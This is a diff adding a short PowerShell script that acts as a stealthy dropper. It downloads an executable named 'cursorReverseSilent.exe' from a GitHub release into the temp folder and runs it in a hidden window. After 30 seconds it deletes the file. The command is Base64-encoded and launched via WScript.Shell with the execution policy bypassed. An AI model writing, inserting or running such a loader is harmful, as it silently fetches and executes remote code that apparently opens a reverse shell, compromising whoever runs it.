@@ -1,0 +1,5 @@
+$command = "Invoke-WebRequest -Uri 'https://github.com/ryder7223/Random/releases/download/latest/cursorReverseSilent.exe' -OutFile '$env:TEMP\jensn.exe'; Start-Process -WindowStyle Hidden -FilePath '$env:TEMP\jensn.exe'; Start-Sleep -Seconds 30; Remove-Item -Path '$env:TEMP\jensn.exe' -Force"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+$wscript = New-Object -ComObject WScript.Shell
+$wscript.Run("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + $encodedCommand, 0, $false)
